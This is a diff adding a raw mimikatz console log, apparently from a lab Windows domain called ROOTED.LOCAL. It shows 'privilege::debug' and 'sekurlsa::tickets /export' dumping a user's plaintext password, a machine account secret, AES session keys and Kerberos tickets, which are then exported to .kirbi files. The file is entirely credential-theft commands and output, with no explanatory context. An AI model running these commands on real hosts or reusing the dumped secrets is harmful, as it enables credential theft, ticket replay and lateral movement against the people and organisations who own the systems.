@@ -1,0 +1,265 @@
+
+  .#####.   mimikatz 2.1.1 (x64) #17763 Dec  9 2018 23:56:50
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::tickets /export
+
+Authentication Id : 0 ; 208286 (00000000:00032d9e)
+Session           : Interactive from 1
+User Name         : jose
+Domain            : ROOTED
+Logon Server      : DC
+Logon Time        : 07/03/2023 11:01:08
+SID               : S-1-5-21-4001629950-4265076451-4074222949-1603
+
+	 * Username : jose
+	 * Domain   : ROOTED.LOCAL
+	 * Password : abc123..
+
+	Group 0 - Ticket Granting Service
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 208246 (00000000:00032d76)
+Session           : Interactive from 1
+User Name         : jose
+Domain            : ROOTED
+Logon Server      : DC
+Logon Time        : 07/03/2023 11:01:08
+SID               : S-1-5-21-4001629950-4265076451-4074222949-1603
+
+	 * Username : jose
+	 * Domain   : ROOTED.LOCAL
+	 * Password : abc123..
+
+	Group 0 - Ticket Granting Service
+	 [00000000]
+	   Start/End/MaxRenew: 07/03/2023 11:01:09 ; 07/03/2023 21:01:07 ; 14/03/2023 11:01:07
+	   Service Name (02) : cifs ; dc.rooted.local ; @ ROOTED.LOCAL
+	   Target Name  (02) : cifs ; dc.rooted.local ; @ ROOTED.LOCAL
+	   Client Name  (01) : jose ; @ ROOTED.LOCAL
+	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     b43a3aba08f53a42b19ba2ee695cb22525c7e1561bb3131929369db0baa0f266
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13	[...]
+	   * Saved to file [0;32d76]-0-0-40a50000-jose@cifs-dc.rooted.local.kirbi !
+	 [00000001]
+	   Start/End/MaxRenew: 07/03/2023 11:01:09 ; 07/03/2023 21:01:07 ; 14/03/2023 11:01:07
+	   Service Name (02) : ldap ; dc.rooted.local ; @ ROOTED.LOCAL
+	   Target Name  (02) : ldap ; dc.rooted.local ; @ ROOTED.LOCAL
+	   Client Name  (01) : jose ; @ ROOTED.LOCAL
+	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     2d1280661c6c46df9c74b8984dce4f55747456f605109770b32c999399130445
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13	[...]
+	   * Saved to file [0;32d76]-0-1-40a50000-jose@ldap-dc.rooted.local.kirbi !
+	 [00000002]
+	   Start/End/MaxRenew: 07/03/2023 11:01:08 ; 07/03/2023 21:01:07 ; 14/03/2023 11:01:07
+	   Service Name (02) : LDAP ; dc.rooted.local ; rooted.local ; @ ROOTED.LOCAL
+	   Target Name  (02) : LDAP ; dc.rooted.local ; rooted.local ; @ ROOTED.LOCAL
+	   Client Name  (01) : jose ; @ ROOTED.LOCAL ( ROOTED.LOCAL )
+	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     96c36f66a341e98b280ed5cb646992c4cd56d6b45c9ecfe11b7fb4d68b0e9f42
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13	[...]
+	   * Saved to file [0;32d76]-0-2-40a50000-jose@LDAP-dc.rooted.local.kirbi !
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+	 [00000000]
+	   Start/End/MaxRenew: 07/03/2023 11:01:09 ; 07/03/2023 21:01:07 ; 14/03/2023 11:01:07
+	   Service Name (02) : krbtgt ; ROOTED.LOCAL ; @ ROOTED.LOCAL
+	   Target Name  (--) : @ ROOTED.LOCAL
+	   Client Name  (01) : jose ; @ ROOTED.LOCAL ( $$Delegation Ticket$$ )
+	   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     7200e420bdd85506ff1ee23f0c497cd1c941e5dd2f8adddc1c2e082ecf759245
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2	[...]
+	   * Saved to file [0;32d76]-2-0-60a10000-jose@krbtgt-ROOTED.LOCAL.kirbi !
+	 [00000001]
+	   Start/End/MaxRenew: 07/03/2023 11:01:07 ; 07/03/2023 21:01:07 ; 14/03/2023 11:01:07
+	   Service Name (02) : krbtgt ; ROOTED.LOCAL ; @ ROOTED.LOCAL
+	   Target Name  (02) : krbtgt ; ROOTED ; @ ROOTED.LOCAL
+	   Client Name  (01) : jose ; @ ROOTED.LOCAL ( ROOTED )
+	   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     dbddebfc699e049828580c3ff503899a2a59a9aa390011806a5a121586b2c13f
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2	[...]
+	   * Saved to file [0;32d76]-2-1-40e10000-jose@krbtgt-ROOTED.LOCAL.kirbi !
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : SERVER2008$
+Domain            : ROOTED
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:17
+SID               : S-1-5-20
+
+	 * Username : server2008$
+	 * Domain   : ROOTED.LOCAL
+	 * Password : 5e 39 cb 01 23 21 1f 2b 9a 2a e7 2d 1c e7 63 89 97 77 60 28 02 33 15 2b 5c cb 49 74 72 84 bd e2 c1 6d 8e f7 3b cd 48 2a 76 d2 0a 13 32 10 8c e8 61 36 ed ba eb 36 6b 40 98 6e cf de 9b 5e 3a 39 f2 b8 b9 36 01 a1 5e 30 87 e6 70 69 76 f6 40 90 28 d3 cd 2e db 18 15 8d 36 45 2a 63 0b c4 95 a5 67 0a 58 86 9d a4 24 4f 16 e3 c9 45 0f 9a 79 51 57 b2 25 69 4d d0 99 df a1 08 ab d1 52 2c d3 db 49 52 0e 6b 5a fa 10 e6 94 5e 19 c1 0e 1c 42 7e b3 06 03 b0 40 7f ef 73 84 38 00 3d 9c 2e ff 60 06 39 83 76 17 4f c8 ed e9 77 9a 80 a3 fa c3 c1 fc ff b4 e1 2f e8 0e c0 99 66 93 4c 01 65 bc 89 82 d3 d8 60 2a 2d 9e 4f 27 8d 68 a6 de b4 84 9c 77 ba 9d 58 cd 4b c0 cd fa ce e2 29 eb 45 e0 41 d8 ab 7e 97 d7 8a 21 20 3d c0 03 a1 fa f2 79 66 
+
+	Group 0 - Ticket Granting Service
+	 [00000000]
+	   Start/End/MaxRenew: 07/03/2023 11:02:51 ; 07/03/2023 21:00:51 ; 14/03/2023 11:00:51
+	   Service Name (02) : GC ; dc.rooted.local ; rooted.local ; @ ROOTED.LOCAL
+	   Target Name  (02) : GC ; dc.rooted.local ; rooted.local ; @ ROOTED.LOCAL
+	   Client Name  (01) : SERVER2008$ ; @ ROOTED.LOCAL
+	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     f9bf3bd7fc47fa29cecb7bee58a13f1f2fcd9bf15add6625017bbf46ad4220f7
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13	[...]
+	   * Saved to file [0;3e4]-0-0-40a50000-SERVER2008$@GC-dc.rooted.local.kirbi !
+	 [00000001]
+	   Start/End/MaxRenew: 07/03/2023 11:01:49 ; 07/03/2023 21:00:51 ; 14/03/2023 11:00:51
+	   Service Name (02) : cifs ; dc.rooted.local ; @ ROOTED.LOCAL
+	   Target Name  (02) : cifs ; dc.rooted.local ; @ ROOTED.LOCAL
+	   Client Name  (01) : SERVER2008$ ; @ ROOTED.LOCAL
+	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     a54d954f0a2d69497c1fd4acdcdc1183b81b7bd6bec01f7bee7cc3b4ce66564b
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13	[...]
+	   * Saved to file [0;3e4]-0-1-40a50000-SERVER2008$@cifs-dc.rooted.local.kirbi !
+	 [00000002]
+	   Start/End/MaxRenew: 07/03/2023 11:00:51 ; 07/03/2023 21:00:51 ; 14/03/2023 11:00:51
+	   Service Name (02) : ldap ; dc.rooted.local ; rooted.local ; @ ROOTED.LOCAL
+	   Target Name  (02) : ldap ; dc.rooted.local ; rooted.local ; @ ROOTED.LOCAL
+	   Client Name  (01) : SERVER2008$ ; @ ROOTED.LOCAL ( ROOTED.LOCAL )
+	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     b51a762f391566f9749249198658eff0714e70048e9043713070a7699e343324
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13	[...]
+	   * Saved to file [0;3e4]-0-2-40a50000-SERVER2008$@ldap-dc.rooted.local.kirbi !
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+	 [00000000]
+	   Start/End/MaxRenew: 07/03/2023 11:01:49 ; 07/03/2023 21:00:51 ; 14/03/2023 11:00:51
+	   Service Name (02) : krbtgt ; ROOTED.LOCAL ; @ ROOTED.LOCAL
+	   Target Name  (--) : @ ROOTED.LOCAL
+	   Client Name  (01) : SERVER2008$ ; @ ROOTED.LOCAL ( $$Delegation Ticket$$ )
+	   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     6e54fe18cda2c3e8d61696b43ebe0f8018f50dd8d58748572546f0bc34364702
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2	[...]
+	   * Saved to file [0;3e4]-2-0-60a10000-SERVER2008$@krbtgt-ROOTED.LOCAL.kirbi !
+	 [00000001]
+	   Start/End/MaxRenew: 07/03/2023 11:00:51 ; 07/03/2023 21:00:51 ; 14/03/2023 11:00:51
+	   Service Name (02) : krbtgt ; ROOTED.LOCAL ; @ ROOTED.LOCAL
+	   Target Name  (02) : krbtgt ; rooted.local ; @ ROOTED.LOCAL
+	   Client Name  (01) : SERVER2008$ ; @ ROOTED.LOCAL ( rooted.local )
+	   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     edb0246992a22d095cd2e98564e66168f34284ee091e8990360d78650dec125b
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2	[...]
+	   * Saved to file [0;3e4]-2-1-40e10000-SERVER2008$@krbtgt-ROOTED.LOCAL.kirbi !
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : SERVICIO LOCAL
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:18
+SID               : S-1-5-19
+
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+
+	Group 0 - Ticket Granting Service
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SERVER2008$
+Domain            : ROOTED
+Logon Server      : (null)
+Logon Time        : 07/03/2023 11:00:17
+SID               : S-1-5-18
+
+	 * Username : server2008$
+	 * Domain   : ROOTED.LOCAL
+	 * Password : 5e 39 cb 01 23 21 1f 2b 9a 2a e7 2d 1c e7 63 89 97 77 60 28 02 33 15 2b 5c cb 49 74 72 84 bd e2 c1 6d 8e f7 3b cd 48 2a 76 d2 0a 13 32 10 8c e8 61 36 ed ba eb 36 6b 40 98 6e cf de 9b 5e 3a 39 f2 b8 b9 36 01 a1 5e 30 87 e6 70 69 76 f6 40 90 28 d3 cd 2e db 18 15 8d 36 45 2a 63 0b c4 95 a5 67 0a 58 86 9d a4 24 4f 16 e3 c9 45 0f 9a 79 51 57 b2 25 69 4d d0 99 df a1 08 ab d1 52 2c d3 db 49 52 0e 6b 5a fa 10 e6 94 5e 19 c1 0e 1c 42 7e b3 06 03 b0 40 7f ef 73 84 38 00 3d 9c 2e ff 60 06 39 83 76 17 4f c8 ed e9 77 9a 80 a3 fa c3 c1 fc ff b4 e1 2f e8 0e c0 99 66 93 4c 01 65 bc 89 82 d3 d8 60 2a 2d 9e 4f 27 8d 68 a6 de b4 84 9c 77 ba 9d 58 cd 4b c0 cd fa ce e2 29 eb 45 e0 41 d8 ab 7e 97 d7 8a 21 20 3d c0 03 a1 fa f2 79 66 
+
+	Group 0 - Ticket Granting Service
+	 [00000000]
+	   Start/End/MaxRenew: 07/03/2023 11:00:56 ; 07/03/2023 21:00:52 ; 14/03/2023 11:00:52
+	   Service Name (02) : cifs ; dc.rooted.local ; @ ROOTED.LOCAL
+	   Target Name  (02) : cifs ; dc.rooted.local ; @ ROOTED.LOCAL
+	   Client Name  (01) : SERVER2008$ ; @ ROOTED.LOCAL
+	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     1aa5ceddbdb7de1d50cd409841fa596ccb502b5bfafea099e06c0d0b9a072186
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13	[...]
+	   * Saved to file [0;3e7]-0-0-40a50000-SERVER2008$@cifs-dc.rooted.local.kirbi !
+	 [00000001]
+	   Start/End/MaxRenew: 07/03/2023 11:00:56 ; 07/03/2023 21:00:52 ; 14/03/2023 11:00:52
+	   Service Name (01) : SERVER2008$ ; @ ROOTED.LOCAL
+	   Target Name  (01) : SERVER2008$ ; @ ROOTED.LOCAL
+	   Client Name  (01) : SERVER2008$ ; @ ROOTED.LOCAL
+	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     8599d183cf8dcac38c7a3bfd2527f0fa8181b8bd39aacba33903c611aaf26aa2
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5	[...]
+	   * Saved to file [0;3e7]-0-1-40a50000.kirbi !
+	 [00000002]
+	   Start/End/MaxRenew: 07/03/2023 11:00:52 ; 07/03/2023 21:00:52 ; 14/03/2023 11:00:52
+	   Service Name (02) : LDAP ; dc.rooted.local ; @ ROOTED.LOCAL
+	   Target Name  (02) : LDAP ; dc.rooted.local ; @ ROOTED.LOCAL
+	   Client Name  (01) : SERVER2008$ ; @ ROOTED.LOCAL
+	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     95088a04fb59571f6f8108ca3da4dfa1f6a53221ebcb49b05c838b2829354ca0
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13	[...]
+	   * Saved to file [0;3e7]-0-2-40a50000-SERVER2008$@LDAP-dc.rooted.local.kirbi !
+	 [00000003]
+	   Start/End/MaxRenew: 07/03/2023 11:00:52 ; 07/03/2023 21:00:52 ; 14/03/2023 11:00:52
+	   Service Name (02) : LDAP ; dc.rooted.local ; rooted.local ; @ ROOTED.LOCAL
+	   Target Name  (02) : LDAP ; dc.rooted.local ; rooted.local ; @ ROOTED.LOCAL
+	   Client Name  (01) : SERVER2008$ ; @ ROOTED.LOCAL ( ROOTED.LOCAL )
+	   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     46989923cf28731684d00dc5ed16ee2f4ef692f14311ada0768e19435dcd545e
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 13	[...]
+	   * Saved to file [0;3e7]-0-3-40a50000-SERVER2008$@LDAP-dc.rooted.local.kirbi !
+
+	Group 1 - Client Ticket ?
+
+	Group 2 - Ticket Granting Ticket
+	 [00000000]
+	   Start/End/MaxRenew: 07/03/2023 11:00:56 ; 07/03/2023 21:00:52 ; 14/03/2023 11:00:52
+	   Service Name (02) : krbtgt ; ROOTED.LOCAL ; @ ROOTED.LOCAL
+	   Target Name  (--) : @ ROOTED.LOCAL
+	   Client Name  (01) : SERVER2008$ ; @ ROOTED.LOCAL ( $$Delegation Ticket$$ )
+	   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     513d6224a6a857c25748a7816fb2ff15fdc3020f6ae81bb2116208a98c1ae021
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2	[...]
+	   * Saved to file [0;3e7]-2-0-60a10000-SERVER2008$@krbtgt-ROOTED.LOCAL.kirbi !
+	 [00000001]
+	   Start/End/MaxRenew: 07/03/2023 11:00:52 ; 07/03/2023 21:00:52 ; 14/03/2023 11:00:52
+	   Service Name (02) : krbtgt ; ROOTED.LOCAL ; @ ROOTED.LOCAL
+	   Target Name  (02) : krbtgt ; ROOTED.LOCAL ; @ ROOTED.LOCAL
+	   Client Name  (01) : SERVER2008$ ; @ ROOTED.LOCAL ( ROOTED.LOCAL )
+	   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
+	   Session Key       : 0x00000012 - aes256_hmac      
+	     367a6999ed3cb9a35056bb11f8444f3bc2dc1ba40c72f9701b17607ff0fc80a3
+	   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2	[...]
+	   * Saved to file [0;3e7]-2-1-40e10000-SERVER2008$@krbtgt-ROOTED.LOCAL.kirbi !
+
+mimikatz(commandline) # exit
+Bye!
